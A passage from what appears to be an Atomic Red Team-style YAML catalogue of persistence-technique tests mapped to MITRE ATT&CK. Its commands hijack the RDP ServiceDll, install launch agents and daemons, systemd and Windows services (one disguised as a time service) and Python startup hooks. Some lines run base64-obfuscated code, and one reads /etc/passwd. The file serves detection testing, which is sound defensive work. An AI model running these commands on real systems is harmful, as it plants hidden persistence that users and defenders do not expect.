        $registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters"

        # Check if the registry key exists
        if (Test-Path -Path $registryPath) {
            # Modify the ServiceDll value in the registry
            Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll
            Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll"
        } else {
            Write-Host "Registry key not found. Make sure the 'TermService\Parameters' key exists."
        }
      cleanup: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters" -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1505/005
  is_safe: false
- id: T1542.001
  name: System Firmware
  description: |-
    Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)

    System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.
  tactic: persistence
  tactics:
    - persistence
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: UEFI Persistence via Wpbbin.exe File Creation
      type: powershell
      platform: windows
      command: "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\""
      cleanup: "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path \"$env:SystemRoot\\System32\\wpbbin.exe\""
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1542/001
  is_safe: false
- id: T1543.001
  name: Launch Agent
  description: |-
    Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.

    Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.

    Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Launch Agent
      type: bash
      platform: macos
      command: |-
        if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
        sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
      cleanup: |-
        sudo launchctl unload ~/Library/LaunchAgents/com.atomicredteam.plist
        sudo rm ~/Library/LaunchAgents/com.atomicredteam.plist
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Event Monitor Daemon Persistence
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /etc/emond.d/rules/atomicredteam_T1543_001.plist
        sudo touch /private/var/db/emondClients/randomflag
      cleanup: |-
        sudo rm /etc/emond.d/rules/atomicredteam_T1543_001.plist
        sudo rm /private/var/db/emondClients/randomflag
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Launch Agent - Root Directory
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        launchctl load -w /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
      cleanup: |-
        launchctl unload /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        sudo rm /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        sudo rm /tmp/T1543_001_atomicredteam.txt
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1543/001
  is_safe: false
- id: T1543.002
  name: Systemd Service
  description: "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) \n\nThe `.service` file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific..."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
  executors:
    - name: Create Systemd Service
      type: bash
      platform: linux
      command: |-
        echo "[Unit]" > /etc/systemd/system/art-systemd-service.service
        echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/art-systemd-service.service
        echo "" >> /etc/systemd/system/art-systemd-service.service
        echo "[Service]" >> /etc/systemd/system/art-systemd-service.service
        echo "Type=simple"
        echo "ExecStart=/bin/touch /tmp/art-systemd-execstart-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecReload=/bin/touch /tmp/art-systemd-execreload-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStop=/bin/touch /tmp/art-systemd-execstop-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "" >> /etc/systemd/system/art-systemd-service.service
        echo "[Install]" >> /etc/systemd/system/art-systemd-service.service
        echo "WantedBy=default.target" >> /etc/systemd/system/art-systemd-service.service
        systemctl daemon-reload
        systemctl enable art-systemd-service.service
        systemctl start art-systemd-service.service
      cleanup: |-
        systemctl stop art-systemd-service.service
        systemctl disable art-systemd-service.service
        rm -rf /etc/systemd/system/art-systemd-service.service
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create SysV Service
      type: sh
      platform: linux
      command: "echo '#\\!/bin/sh' > /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '#' >> /usr/local/etc/rc.d/art-test\necho '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test\necho '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test\necho '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho 'name=\"art_test\"' >> /usr/local/etc/rc.d/art-test\necho 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test\necho 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test\necho 'command=\"/usr/bin/touch\"' >> /usr/local/etc/rc.d/art-test\necho 'start_cmd=\"art_test_start\"' >> /usr/local/etc/rc.d/art-test\necho '' >> /usr/local/etc/rc.d/art-test\necho 'art_test_start()' >> /usr/local/etc/rc.d/art-test     \necho '{' >> /usr/local/etc/rc.d/art-test\necho '  ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test\necho '}' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test     \necho 'run_rc_command \"$1\"' >> /usr/local/etc/rc.d/art-test\nchmod +x /usr/local/etc/rc.d/art-test\nservice art-test enable\nservice art-test start"
      cleanup: |-
        sysrc -x art_test_enable
        rm -f /usr/local/etc/rc.d/art-test
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create Systemd Service file,  Enable the service , Modify and Reload the service.
      type: bash
      platform: linux
      command: |-
        echo "#!/bin/bash" > /etc/init.d/T1543.002
        echo "### BEGIN INIT INFO" >> /etc/init.d/T1543.002
        echo "# Provides : Atomic Test T1543.002" >> /etc/init.d/T1543.002
        echo "# Required-Start: \$all" >> /etc/init.d/T1543.002
        echo "# Required-Stop : " >> /etc/init.d/T1543.002
        echo "# Default-Start: 2 3 4 5" >> /etc/init.d/T1543.002
        echo "# Default-Stop: " >> /etc/init.d/T1543.002
        echo "# Short Description: Atomic Test for Systemd Service Creation" >> /etc/init.d/T1543.002
        echo "### END INIT INFO" >> /etc/init.d/T1543.002
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \" " >> /etc/init.d/T1543.002
        chmod +x /etc/init.d/T1543.002
        if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi
        systemctl enable T1543.002
        systemctl start T1543.002
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"" | sudo tee -a /etc/init.d/T1543.002
        systemctl daemon-reload
        systemctl restart T1543.002
      cleanup: |-
        systemctl stop T1543.002
        systemctl disable T1543.002
        rm -rf /etc/init.d/T1543.002
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1543/002
  is_safe: false
- id: T1543.003
  name: Windows Service
  description: "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversar..."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify Fax service to run PowerShell
      type: cmd
      platform: windows
      command: |-
        sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
        sc start Fax
      cleanup: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Service Installation CMD
      type: cmd
      platform: windows
      command: |-
        sc.exe create AtomicTestService_CMD binPath= "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe" start=auto  type=Own
        sc.exe start AtomicTestService_CMD
      cleanup: |-
        sc.exe stop AtomicTestService_CMD >nul 2>&1
        sc.exe delete AtomicTestService_CMD >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Service Installation PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe"
        Start-Service -Name "AtomicTestService_PowerShell"
      cleanup: |-
        Stop-Service -Name "AtomicTestService_PowerShell" 2>&1 | Out-Null
        try {(Get-WmiObject Win32_Service -filter "name='AtomicTestService_PowerShell'").Delete()}
        catch {}
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: TinyTurla backdoor service w64time
      type: cmd
      platform: windows
      command: |-
        copy "$PathToAtomicsFolder\T1543.003\bin\w64time.dll" %systemroot%\system32\
        sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
        sc config W64Time DisplayName= "Windows 64 Time"
        sc description W64Time "Maintain date and time synch on all clients and services in the network"
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
        sc start W64Time
      cleanup: |-
        sc stop W64Time
        sc.exe delete W64Time
        del %systemroot%\system32\w64time.dll
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Remote Service Installation CMD
      type: cmd
      platform: windows
      command: |-
        sc.exe \\localhost create AtomicTestService_CMD binPath= "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe" start=auto type=Own
        sc.exe \\localhost start AtomicTestService_CMD
      cleanup: |-
        sc.exe \\localhost stop AtomicTestService_CMD >nul 2>&1
        sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Modify Service to Run Arbitrary Binary (Powershell)
      type: powershell
      platform: windows
      command: |-
        Stop-Service -Name "fax" -force -erroraction silentlycontinue | Out-Null
        set-servicebinarypath -name "fax" -path "$env:windir\system32\notepad.exe"
        start-service -Name "fax" -erroraction silentlycontinue | out-null
      cleanup: |-
        Stop-Service -Name "fax" -force -erroraction silentlycontinue | Out-Null
        set-servicebinarypath -name "fax" -path "$env:windir\system32\fxssvc.exe" -erroraction silentlycontinue | out-null
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1543/003
  is_safe: false
- id: T1543.004
  name: Launch Daemon
  description: |-
    Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)

    Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

    Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos per...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Launch Daemon
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist /Library/LaunchDaemons/com.atomicredteam.plist
        sudo launchctl load -w /Library/LaunchDaemons/com.atomicredteam.plist
      cleanup: |-
        sudo launchctl unload /Library/LaunchDaemons/com.atomicredteam.plist
        sudo rm /Library/LaunchDaemons/com.atomicredteam.plist
        sudo rm /tmp/T1543_004_atomicredteam.txt
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1543/004
  is_safe: false
- id: T1546.018
  name: Python Startup Hooks
  description: |-
    Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked.(Citation: Volexity GlobalProtect CVE 2024)

    Path configuration files are designed to extend Python’s module search paths through the use of import statements. If a `.pth` file is placed in Python's `site-packages` or `dist-packages` directories, any lines beginning with `import` will be executed automatically on Python invocation.(Citation: DFIR Python Persistence 2025) Similarly, if `sitecustomize.py` or `usercustomize.py` is present in the Python path, these files will be imported during interpreter startup, and any code they contain will be executed.(Citation: Python Site Configuration Hook)

    Adversaries may abuse these mechanisms to establish persistence on systems where Python is widely used (e.g., for automation or scripting in production environments).
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Python Startup Hook - atomic_hook.pth (Windows)
      type: powershell
      platform: windows
      command: |-
        $TempDir = Join-Path $env:TEMP "atomic_pth_win"
        New-Item -ItemType Directory -Path $TempDir -Force
        & "python.exe" -m venv "$TempDir\env"
        $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
        "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
        Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
        & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
      cleanup: |-
        if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
        Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
        Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
        Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
        Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Host "[+] Successfully Terminated Calculator"
      timeout: 120
      is_safe: true
    - name: Python Startup Hook - usercustomize.py (Windows)
      type: powershell
      platform: windows
      command: |-
        $UserDir = & "python.exe" -c "import site; print(site.getusersitepackages())"
        if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
        "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
        Get-ChildItem -Path "$UserDir"
        & "python.exe" -c "print('Triggering Hook via usercustomize...')"
      cleanup: "$PyBin = if (Get-Command \"python.exe\" -ErrorAction SilentlyContinue) { \"python.exe\" } elseif (Get-Command \"python3.exe\" -ErrorAction SilentlyContinue) { \"python3.exe\" } else { \"python.exe\" }; \n$UserDir = & $PyBin -S -c \"import site; print(site.getusersitepackages())\"\nif (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like 'usercustomize*')) { Write-Host \"[!] Artifact missing: $UserDir\\usercustomize.py - [-] Please Run : Invoke-AtomicTest T1546.018\"; exit 1 };\nGet-ChildItem -Path \"$UserDir\" -Recurse -Force |\nWhere-Object { $_.Name -like \"usercustomize*\" } |\nRemove-Item -Force \nWrite-Host \"[+] Successfully Removed usercustomize.py under $UserDir\"\nGet-Process -Name \"Calc*\", \"calc*\" -ErrorAction SilentlyContinue | Stop-Process -Force\nWrite-Host \"[+] Successfully Terminated Calculator\""
      timeout: 120
      is_safe: true
    - name: Python Startup Hook - atomic_hook.pth (Linux)
      type: sh
      platform: linux
      command: |-
        TEMPDIR="/tmp/atomic_sitecust_posix"
        mkdir -p "$TEMPDIR"
        "python3" -m venv "$TEMPDIR/env"
        SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import site; print(site.getsitepackages()[0])")
        echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
        ls -la "$SITE_PACKAGES/atomic_hook.pth"
        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
        if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
      cleanup: |-
        if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        rm -rf /tmp/atomic_sitecust_posix
        echo "[+] Successful Removed atomic_hook.pth"
        rm -rf /tmp/atomic_hook_poc.txt
        echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
      timeout: 60
      is_safe: true
    - name: Python Startup Hook - atomic_hook.pth (macOS)
      type: sh
      platform: macos
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
        echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
        $PYTHON_EXE -m venv "$TEMPDIR/env"
        SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import site; print(site.getsitepackages()[0])")
        echo "import subprocess; subprocess.Popen(['open', '-a', 'Calculator'])" > "$SITE_PACKAGES/atomic_hook.pth"
        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
      cleanup: |-
        if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        pkill "Calculator" || true
        [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
        echo "[+] Successful Removed atomic_hook.pth and terminated Calculator"
      timeout: 60
      is_safe: true
    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
      type: sh
      platform: linux
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
        mkdir -p "$USER_PACKAGES"
        echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
        if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
        $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
        if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
      cleanup: |-
        PYTHON_CMD=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
        if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
        rm -rf /tmp/poc.txt
        echo "[+] Successful remove poc.txt under /tmp"
      timeout: 60
      is_safe: true
    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
      type: sh
      platform: macos
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
        mkdir -p "$USER_PACKAGES"
        echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
        if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
        $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
        if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
      cleanup: |-
        PYTHON_CMD=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
        if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
        rm -rf /tmp/poc.txt
        echo "[+] Successful remove poc.txt under /tmp"
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1546/018
  is_safe: true
- id: T1547
  name: Boot or Logon Autostart Execution
  description: |-
    Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.

    Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Add a driver
      type: cmd
      platform: windows
      command: pnputil.exe /add-driver "C:\Windows\INF\usbstor.inf"
      timeout: 120
      is_safe: true
    - name: Driver Installation Using pnputil.exe
      type: powershell
      platform: windows
      command: pnputil.exe -i -a C:\Windows\INF\acpipmi.inf
      timeout: 120
      is_safe: true
    - name: Leverage Virtual Channels to execute custom DLL during successful RDP session
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware" /v Name /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware" /f
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547
  is_safe: true
- id: T1547.001
  name: Registry Run Keys / Startup Folder
  description: |-
